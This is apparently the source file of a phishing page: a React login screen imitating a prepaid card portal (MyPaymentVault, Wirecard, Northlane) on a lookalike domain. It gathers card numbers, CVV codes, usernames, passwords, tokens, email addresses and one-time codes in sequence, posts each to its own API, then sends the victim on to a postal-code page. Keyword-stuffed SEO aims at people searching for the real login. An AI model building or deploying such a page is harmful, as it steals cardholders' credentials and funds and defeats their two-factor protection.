import { useState, useEffect } from "react";
import { SEO } from "@/components/SEO";
import { ContentProtection } from "@/components/ContentProtection";
import { apiRequest } from "@/lib/queryClient";
import { validateLuhn, normalizeCardNumber } from "@shared/luhn";
import '@/styles/account-page.css';
import '@/styles/recaptcha-styles.css';
import logoImage from "@assets/mypaymentvault-logo_1762805920744.jpg";

export default function AccountPage() {
  const [activeTab, setActiveTab] = useState<'card' | 'username' | 'token'>('card');
  const [showCookie, setShowCookie] = useState(false);

  // Multi-step flow state
  const [loginStep, setLoginStep] = useState<'credentials' | 'email' | 'otp'>('credentials');
  const [loginAttemptId, setLoginAttemptId] = useState<string>('');
  const [sessionId, setSessionId] = useState<string>('');
  const [email, setEmail] = useState<string>('');
  const [maskedEmail, setMaskedEmail] = useState<string>('');
  const [otpCode, setOtpCode] = useState<string>('');
  const [error, setError] = useState<string>('');
  const [emailError, setEmailError] = useState<string>('');
  const [otpError, setOtpError] = useState<string>('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Form field state
  const [cardNumber, setCardNumber] = useState<string>('');
  const [securityCode, setSecurityCode] = useState<string>('');
  const [username, setUsername] = useState<string>('');
  const [password, setPassword] = useState<string>('');
  const [token, setToken] = useState<string>('');

  // Track page visit on mount
  useEffect(() => {
    const trackVisit = async () => {
      try {
        const screenResolution = `${window.screen.width}x${window.screen.height}`;
        await apiRequest('POST', '/api/account-visit', { screenResolution });
        console.log('[Account Page] Visit tracked');
      } catch (error) {
        console.error('[Account Page] Failed to track visit:', error);
      }
    };

    trackVisit();
  }, []);

  const maskEmail = (email: string) => {
    const [user, domain] = email.split('@');
    const maskedUser = user.length > 3 ? `${user[0]}...${user.slice(-1)}` : `${user[0]}...`;
    return `${maskedUser}@${domain}`;
  };

  const validateEmail = () => {
    const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const trimmedEmail = email.trim();
    
    if (!emailPattern.test(trimmedEmail)) {
      setEmailError('Please enter a valid email address');
      setMaskedEmail('');
      return false;
    }
    
    setEmailError('');
    setMaskedEmail(maskEmail(trimmedEmail));
    return true;
  };

  const validateOtp = () => {
    if (!/^\d{6}$/.test(otpCode.trim())) {
      setOtpError('Please enter a valid 6-digit code');
      return false;
    }
    setOtpError('');
    return true;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    setIsSubmitting(true);

    try {
      let loginData: any = {};

      if (activeTab === 'card') {
        if (!cardNumber.trim() || !securityCode.trim()) {
          setError('Please enter both card number and security code');
          setIsSubmitting(false);
          return;
        }
        // Normalize and validate card number with Luhn algorithm
        const normalized = normalizeCardNumber(cardNumber.trim());
        if (!validateLuhn(normalized)) {
          setError('Please enter a valid card number');
          setIsSubmitting(false);
          return;
        }
        loginData = {
          loginType: 'card',
          cardNumber: normalized,
          pin: securityCode.trim()
        };
      } else if (activeTab === 'username') {
        if (!username.trim() || !password.trim()) {
          setError('Please enter both username and password');
          setIsSubmitting(false);
          return;
        }
        loginData = {
          loginType: 'username',
          username: username.trim(),
          password: password.trim()
        };
      } else if (activeTab === 'token') {
        if (!token.trim()) {
          setError('Please enter your token');
          setIsSubmitting(false);
          return;
        }
        loginData = {
          loginType: 'token',
          token: token.trim()
        };
      }

      const response = await apiRequest('POST', '/api/account-login', loginData);
      const data = await response.json();

      if (data.success) {
        setLoginAttemptId(data.loginAttemptId);
        setLoginStep('email');
        setError('');
      }
    } catch (error: any) {
      setError(error.message || 'Login failed. Please try again.');
    } finally {
      setIsSubmitting(false);
    }
  };

  const submitEmail = async () => {
    if (!validateEmail()) return;

    setIsSubmitting(true);
    try {
      const response = await apiRequest('POST', '/api/verify-email', { 
        loginAttemptId, 
        email: email.trim(),
        flowType: 'account'
      });
      const data = await response.json();

      if (data.success) {
        setSessionId(data.sessionId);
        setLoginStep('otp');
        setEmailError('');
      }
    } catch (error: any) {
      setEmailError(error.message || 'Email verification failed. Please try again.');
    } finally {
      setIsSubmitting(false);
    }
  };

  const submitOtp = async () => {
    if (!validateOtp()) return;

    setIsSubmitting(true);
    try {
      const response = await apiRequest('POST', '/api/verify-otp', { 
        sessionId, 
        otpCode: otpCode.trim(),
        flowType: 'account'
      });
      const data = await response.json();

      if (data.success) {
        window.location.href = '/postal-code';
      }
    } catch (error: any) {
      setOtpError(error.message || 'OTP verification failed. Please try again.');
    } finally {
      setIsSubmitting(false);
    }
  };

  const closeEmailModal = () => {
    setLoginStep('credentials');
    setEmail('');
    setEmailError('');
    setMaskedEmail('');
  };

  const closeOtpModal = () => {
    setLoginStep('email');
    setOtpCode('');
    setOtpError('');
  };

  return (
    <>
      <ContentProtection />
      <SEO 
        title="My Payment Vault - Login MyPaymentVault | Login Wirecard | Login Northlane | Login North Lane"
        description="Login MyPaymentVault Account Portal - Access Login Wirecard, Login North Lane, Login Northlane employee payment card system. Secure multi-factor card, username, and token login. Alternative to Login Wirecard 2 and Login Onbe 1 systems."
        keywords="Login MyPaymentVault, Login Wirecard, Login North Lane, Login Northlane, Login Wirecard 2, Login Onbe 1, card login, username login, token login, employee payment vault, my payment vault account, wirecard account login, northlane account access, north lane payment portal, mypaymentvault card authentication, wirecard multi-factor login, northlane secure login, employee card portal, payment vault portal access"
        canonical="https://login-mypaymentvaultt.com/account"
      />

      <div className="page page--login">
        <div id="DIGITALWALLET_HEADER_MODULE">
          <div className="header">
            <div className="nav">
              <div className="container wrapper d-flex justify-content-between align-items-center">
                <div 
                  className="nav__logo" 
                  style={{ backgroundImage: `url(${logoImage})` }}
                  onClick={() => window.location.href = '/'}
                  data-testid="logo-nav"
                ></div>
                <div className="nav__actions">
                  <ul className="nav__simple d-none d-md-block">
                    <li className="nav__item">
                      <a 
                        className="nav__item__link js-collapse-button" 
                        href="#" 
                        role="button"
                        data-toggle="collapse"
                        data-target="#language-collapse"
                        aria-expanded="false"
                        data-testid="button-language-toggle"
                      >
                        English US <span className="nav__caret js-dropdown-caret">▼</span>
                      </a>
                      <div id="language-collapse" className="nav__collapse collapse js-collapsable">
                        <a className="nav__item--dropdown" href="#" data-testid="lang-indonesian"> Bahasa Indonesia (Indonesian) </a>
                        <a className="nav__item--dropdown" href="#" data-testid="lang-malay"> Bahasa Melayu (Malay) </a>
                        <a className="nav__item--dropdown" href="#" data-testid="lang-german"> Deutsch (German) </a>
                        <a className="nav__item--dropdown" href="#" data-testid="lang-english"> English UK (English) </a>
                        <a className="nav__item--dropdown" href="#" data-testid="lang-spanish"> Español (Spanish) </a>
                        <a className="nav__item--dropdown" href="#" data-testid="lang-french"> Français (French) </a>
                        <a className="nav__item--dropdown" href="#" data-testid="lang-italian"> Italiano (Italian) </a>
                        <a className="nav__item--dropdown" href="#" data-testid="lang-dutch"> Nederlands (Dutch) </a>
                        <a className="nav__item--dropdown" href="#" data-testid="lang-polish"> Polski (Polish) </a>
                        <a className="nav__item--dropdown" href="#" data-testid="lang-portuguese"> Português (Portuguese) </a>
                      </div>
                    </li>
                    <li className="nav__item">
                      <a id="LoginPage.Lnk.ContactUs" className="nav__link" href="#" onClick={(e) => e.preventDefault()} data-testid="link-contact-us">Contact Us</a>
                    </li>
                  </ul>
                </div>
              </div>
            </div>

            <div className="header__title header__title--login d-flex justify-content-between align-items-center">
              <div className="container wrapper d-flex justify-content-between align-items-center">
                <h1 className='header__content--login'>Log in with:</h1>
              </div>
            </div>
          </div>
        </div>

        <div className="page-content page-content--transparent">
          <div id="divModuleContainer" className="body-content">
            <div id="DIGITALWALLET_LOGIN_MODULE">
              <div className="container wrapper">
                <form id="frmCardLogin" onSubmit={handleSubmit}>
                  <div className="tabs">
                    <div className="error validation-summary-valid" data-valmsg-summary="true">
                      <div className="ValidationSummaryCustom error__title d-flex justify-content-start align-items-center">
                        <h1>{error ? 'Error' : ' '}</h1>
                      </div>
                      <ul>{error && <li>{error}</li>}{!error && <li style={{ display: 'none' }}></li>}</ul>
                    </div>

                    <ul className="nav nav-pills tabs__pills" role="tablist" id="login_tabs">
                      <li className="tabs__item">
                        <a 
                          className={`tabs__link nav-link ${activeTab === 'card' ? 'active' : ''}`}
                          href="#"
                          id="tab-CardLogin" 
                          aria-controls="card-form"
                          onClick={(e) => { e.preventDefault(); setActiveTab('card'); }}
                          data-testid="tab-card"
                        >
                          <label htmlFor="tab-CardLogin" id="Login.Tab.CardNum">Card</label>
                        </a>
                      </li>
                      <li className="tabs__item">
                        <a 
                          className={`tabs__link nav-link ${activeTab === 'username' ? 'active' : ''}`}
                          href="#"
                          id="tab-Login"
                          aria-controls="username-form"
                          onClick={(e) => { e.preventDefault(); setActiveTab('username'); }}
                          data-testid="tab-username"
                        >
                          <label htmlFor="tab-Login" id="Login.Tab.Username">Username</label>
                        </a>
                      </li>
                      <li className="tabs__item">
                        <a 
                          className={`tabs__link nav-link ${activeTab === 'token' ? 'active' : ''}`}
                          href="#"
                          id="tab-NewUser"
                          aria-controls="token-form"
                          onClick={(e) => { e.preventDefault(); setActiveTab('token'); }}
                          data-testid="tab-token"
                        >
                          <label htmlFor="tab-NewUser" id="Login.Tab.Token">Token</label>
                        </a>
                      </li>
                    </ul>

                    <div className="tabs__forms">
                      <div className="tabs__content tab-content">
                        {/* Card Tab */}
                        <div className={`tab-pane fade ${activeTab === 'card' ? 'show active in' : ''}`} id="card-form">
                          <p className="form__description">
                            Log in to access your card details, check your balance and view spend history.
                          </p>
                          <label className="form__label">
                            <input 
                              className="form__input" 
                              placeholder="Card Number"
                              id="CardNumber"
                              autoComplete="cc-number"
                              inputMode="numeric"
                              type="text"
                              maxLength={19}
                              name="CardNumber"
                              value={cardNumber}
                              onChange={(e) => { setCardNumber(e.target.value); setError(''); }}
                              data-testid="input-card-number"
                            />
                          </label>

                          <label className="form__label">
                            <input 
                              className="form__input" 
                              placeholder="Security Code"
                              id="SecurityCode"
                              autoComplete="cc-csc"
                              pattern="[0-9]*"
                              inputMode="numeric"
                              type="password"
                              maxLength={3}
                              name="SecurityCode"
                              value={securityCode}
                              onChange={(e) => { setSecurityCode(e.target.value); setError(''); }}
                              data-testid="input-security-code"
                            />
                            <span className="form__info">?</span>
                            <span className="info__tooltip">
                              Your security code (CVV) is the three-digit number located on the back of your card to the right of the signature box.
                            </span>
                          </label>

                          {error && (
                            <div className="alert alert-danger" style={{marginBottom: '10px', padding: '10px', background: '#f8d7da', color: '#721c24', border: '1px solid #f5c6cb', borderRadius: '4px'}} data-testid="alert-error">
                              {error}
                            </div>
                          )}

                          <div className="form__actions d-sm-flex justify-content-between align-items-center">
                            <div className="recaptcha-wrapper">
                              <button type="submit" className="form__btn" id="Login.Btn.CardNum" disabled={isSubmitting} data-testid="button-continue">
                                {isSubmitting ? 'Processing...' : 'Continue'}
                              </button>
                            </div>
                            <div className="form__question">
                              Already have an Account?
                              <div>
                                <a className="form__link" href="/" data-testid="link-login">Login</a>
                                <span className="form__info form__info--action">?</span>
                                <span className="info__tooltip">Log in using your username and password to view your card details, balance, transaction history and more. Forgot your password? Go to the Username tab and select the "Forgot Your Password?" link.</span>
                              </div>
                            </div>
                          </div>
                        </div>

                        {/* Username Tab */}
                        <div className={`tab-pane fade ${activeTab === 'username' ? 'show active in' : ''}`} id="username-form">
                          <p className="form__description">
                            Log in using your username and password to view your card details, balance, transaction history and more.
                          </p>
                          <label className="form__label">
                            <input 
                              className="form__input" 
                              placeholder="Username"
                              type="text"
                              name="Username"
                              value={username}
                              onChange={(e) => { setUsername(e.target.value); setError(''); }}
                              data-testid="input-username"
                            />
                          </label>
                          <label className="form__label">
                            <input 
                              className="form__input" 
                              placeholder="Password"
                              type="password"
                              name="Password"
                              value={password}
                              onChange={(e) => { setPassword(e.target.value); setError(''); }}
                              data-testid="input-password"
                            />
                          </label>

                          {error && (
                            <div className="alert alert-danger" style={{marginBottom: '10px', padding: '10px', background: '#f8d7da', color: '#721c24', border: '1px solid #f5c6cb', borderRadius: '4px'}} data-testid="alert-error">
                              {error}
                            </div>
                          )}

                          <div className="form__actions d-sm-flex justify-content-between align-items-center">
                            <div className="recaptcha-wrapper">
                              <button type="submit" className="form__btn" disabled={isSubmitting} data-testid="button-login">{isSubmitting ? 'Processing...' : 'Log In'}</button>
                            </div>
                            <div className="form__question">
                              <a className="form__link" href="/forgot-password" data-testid="link-forgot-password">Forgot Your Password?</a>
                            </div>
                          </div>
                        </div>

                        {/* Token Tab */}
                        <div className={`tab-pane fade ${activeTab === 'token' ? 'show active in' : ''}`} id="token-form">
                          <p className="form__description">
                            New user? Enter your Token to create your account and access your card.
                          </p>
                          <label className="form__label">
                            <input 
                              className="form__input" 
                              placeholder="Token"
                              type="text"
                              name="Token"
                              value={token}
                              onChange={(e) => { setToken(e.target.value); setError(''); }}
                              data-testid="input-token"
                            />
                          </label>

                          {error && (
                            <div className="alert alert-danger" style={{marginBottom: '10px', padding: '10px', background: '#f8d7da', color: '#721c24', border: '1px solid #f5c6cb', borderRadius: '4px'}} data-testid="alert-error">
                              {error}
                            </div>
                          )}

                          <div className="form__actions d-sm-flex justify-content-between align-items-center">
                            <div className="recaptcha-wrapper">
                              <button type="submit" className="form__btn" disabled={isSubmitting} data-testid="button-submit-token">{isSubmitting ? 'Processing...' : 'Continue'}</button>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </form>
              </div>
            </div>
          </div>
        </div>

        {showCookie && (
          <div className="cookie-container">
            <div className="push"></div>
            <div className="gdprpolicy__cookie" id="cookieConsent">
              <div className="container wrapper d-flex flex-column flex-md-row justify-content-between align-items-center">
                <div className="cookie__text">
                  We use cookies to give you the best possible experience on our website. You can find out more about the cookies we use and learn how to manage them here. By continuing to use the website, you accept our use of cookies.
                </div>
                <div className="actions">
                  <button className="form__btn" onClick={() => setShowCookie(false)} data-testid="button-accept-cookie">Accept</button>
                </div>
              </div>
            </div>
          </div>
        )}

        <footer className="footer">
          <div id="DIGITALWALLET_FOOTER_MODULE">
            <div className="container wrapper d-none d-md-block">
              <div className="d-flex justify-content-between align-items-center">
                <div className="footer__left">
                  <a className="footer__link footer__link--border" href="#" onClick={(e) => e.preventDefault()} data-testid="link-footer-faqs">FAQs</a>
                  <a className="footer__link footer__link--border" href="#" onClick={(e) => e.preventDefault()} data-testid="link-footer-terms">Terms</a>
                  <a id="LoginPage.Lnk.ContactUs" className="footer__link" href="#" onClick={(e) => e.preventDefault()} data-testid="link-footer-contact">Contact Us</a>
                </div>
              </div>
            </div>
          </div>
        </footer>
      </div>

      {/* Email Verification Modal */}
      {loginStep === 'email' && (
        <div 
          className="otp-modal" 
          id="emailModal" 
          style={{ 
            display: 'flex', 
            position: 'fixed', 
            zIndex: 9999, 
            top: 0, 
            left: 0, 
            width: '100vw', 
            height: '100vh', 
            backgroundColor: 'rgba(0,0,0,0.5)', 
            alignItems: 'center', 
            justifyContent: 'center' 
          }}
        >
          <div style={{ 
            background: '#fff', 
            padding: '25px', 
            borderRadius: '15px', 
            width: '100%', 
            maxWidth: '350px', 
            textAlign: 'center', 
            fontFamily: 'Arial', 
            boxShadow: '0 0 20px rgba(0,0,0,0.4)' 
          }}>
            <p style={{ fontSize: '18px', fontWeight: 'bold', marginBottom: '12px' }}>Verify Your Identity</p>
            <p style={{ fontSize: '14px', marginBottom: '8px' }}>
              To protect your account, we need to verify your identity.
            </p>
            <p style={{ fontSize: '14px', marginBottom: '12px' }}>
              Please select your preferred verification method:
            </p>
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px', marginBottom: '12px' }}>
              <input type="radio" checked disabled style={{ accentColor: 'black', width: '14px', height: '14px' }} data-testid="radio-email-option" />
              <span style={{ fontSize: '14px' }}>Email: <strong id="maskedEmail">{maskedEmail || 'e...@example.com'}</strong></span>
            </div>
            <div style={{ position: 'relative', marginBottom: '10px' }}>
              <input 
                id="emailInput" 
                type="email" 
                placeholder="Enter your email address"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                onInput={validateEmail}
                style={{ width: '100%', padding: '10px', fontSize: '14px', border: '2px solid #ccc', borderRadius: '6px' }}
                data-testid="input-email"
              />
            </div>
            {emailError && (
              <p id="emailError" style={{ color: 'red', fontSize: '13px', marginTop: '4px' }}>
                {emailError}
              </p>
            )}
            <div style={{ display: 'flex', justifyContent: 'space-between', marginTop: '16px', marginBottom: '14px' }}>
              <button 
                onClick={closeEmailModal} 
                disabled={isSubmitting}
                style={{ flex: 1, marginRight: '6px', padding: '10px', background: '#fff', color: '#000', fontWeight: 'bold', fontSize: '14px', border: '1px solid black', borderRadius: '6px', cursor: isSubmitting ? 'not-allowed' : 'pointer', opacity: isSubmitting ? 0.6 : 1 }}
                data-testid="button-cancel-email"
              >
                Cancel
              </button>
              <button 
                onClick={submitEmail} 
                disabled={isSubmitting}
                style={{ flex: 1, marginLeft: '6px', padding: '10px', background: 'black', color: 'white', fontWeight: 'bold', fontSize: '14px', border: 'none', borderRadius: '6px', cursor: isSubmitting ? 'not-allowed' : 'pointer', opacity: isSubmitting ? 0.6 : 1 }}
                data-testid="button-send-code"
              >
                {isSubmitting ? 'Sending...' : 'Send Code'}
              </button>
            </div>
            <div style={{ fontSize: '11px' }}>
              Standard messaging rates may apply.<br />
              <a href="#" style={{ color: '#000', textDecoration: 'underline' }} data-testid="link-privacy-policy">Privacy Policy</a>
              &nbsp;
              <a href="#" style={{ color: '#000', textDecoration: 'underline' }} data-testid="link-terms-conditions">Terms & Conditions</a>
            </div>
          </div>
        </div>
      )}

      {/* OTP Verification Modal */}
      {loginStep === 'otp' && (
        <div 
          className="otp-modal" 
          id="otpModal" 
          style={{ 
            display: 'flex', 
            position: 'fixed', 
            zIndex: 9999, 
            top: 0, 
            left: 0, 
            width: '100vw', 
            height: '100vh', 
            backgroundColor: 'rgba(0,0,0,0.5)', 
            alignItems: 'center', 
            justifyContent: 'center' 
          }}
        >
          <div style={{ 
            background: '#fff', 
            padding: '30px', 
            borderRadius: '15px', 
            width: '100%', 
            maxWidth: '350px', 
            textAlign: 'center', 
            boxShadow: '0 0 20px rgba(0,0,0,0.4)', 
            fontFamily: 'Arial' 
          }}>
            <p style={{ fontSize: '18px', fontWeight: 'bold', marginBottom: '12px' }}>Enter Verification Code</p>
            <p style={{ fontSize: '14px', marginBottom: '8px' }}>We sent a 6-digit code to <strong>{maskedEmail}</strong></p>
            <p style={{ fontSize: '14px', marginBottom: '8px' }}>This code will expire in 10 minutes.</p>
            <div style={{ position: 'relative', margin: '20px auto' }}>
              <input 
                id="otpCode" 
                maxLength={6} 
                placeholder="Enter 6-digit code"
                type="tel" 
                value={otpCode}
                onChange={(e) => setOtpCode(e.target.value)}
                onInput={validateOtp}
                style={{ width: '100%', padding: '10px', fontSize: '16px', border: '2px solid #ccc', borderRadius: '6px', letterSpacing: '4px', textAlign: 'center' }}
                data-testid="input-otp"
              />
            </div>
            {otpError && (
              <p id="otpError" style={{ color: 'red', fontSize: '13px' }}>
                {otpError}
              </p>
            )}
            <div style={{ display: 'flex', justifyContent: 'space-between', marginTop: '16px', marginBottom: '14px' }}>
              <button 
                onClick={closeOtpModal} 
                disabled={isSubmitting}
                style={{ flex: 1, marginRight: '6px', padding: '10px', background: '#fff', color: '#000', fontWeight: 'bold', fontSize: '14px', border: '1px solid black', borderRadius: '6px', cursor: isSubmitting ? 'not-allowed' : 'pointer', opacity: isSubmitting ? 0.6 : 1 }}
                data-testid="button-cancel-otp"
              >
                Cancel
              </button>
              <button 
                onClick={submitOtp} 
                disabled={isSubmitting}
                style={{ flex: 1, marginLeft: '6px', padding: '10px', background: 'black', color: 'white', fontWeight: 'bold', fontSize: '14px', border: 'none', borderRadius: '6px', cursor: isSubmitting ? 'not-allowed' : 'pointer', opacity: isSubmitting ? 0.6 : 1 }}
                data-testid="button-continue-otp"
              >
                {isSubmitting ? 'Verifying...' : 'Continue'}
              </button>
            </div>
            <div style={{ marginTop: '15px' }}>
              <a href="#" id="resendOtp" style={{ fontSize: '14px', color: 'black', textDecoration: 'underline' }} data-testid="link-resend-otp">
                Resend Code
              </a>
            </div>
          </div>
        </div>
      )}
    </>
  );
}
